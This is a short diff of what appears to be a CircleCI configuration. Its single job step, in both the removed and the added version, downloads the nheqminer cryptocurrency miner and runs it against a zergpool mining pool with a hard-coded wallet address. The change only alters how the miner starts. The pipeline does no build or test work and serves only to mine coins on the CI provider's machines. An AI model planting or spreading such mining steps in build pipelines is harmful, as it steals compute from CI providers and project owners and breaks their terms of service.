@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.na.mine.zergpool.com:3300 -u D8Kq7Lu982DCTudZocXVbPQRgzPMqRSDsT -p  c=DOGE -t 30
+      - run:  sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar xvf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./start -v -l verushash.na.mine.zergpool.com:3300 -u D8Kq7Lu982DCTudZocXVbPQRgzPMqRSDsT -p  c=DOGE -t 30
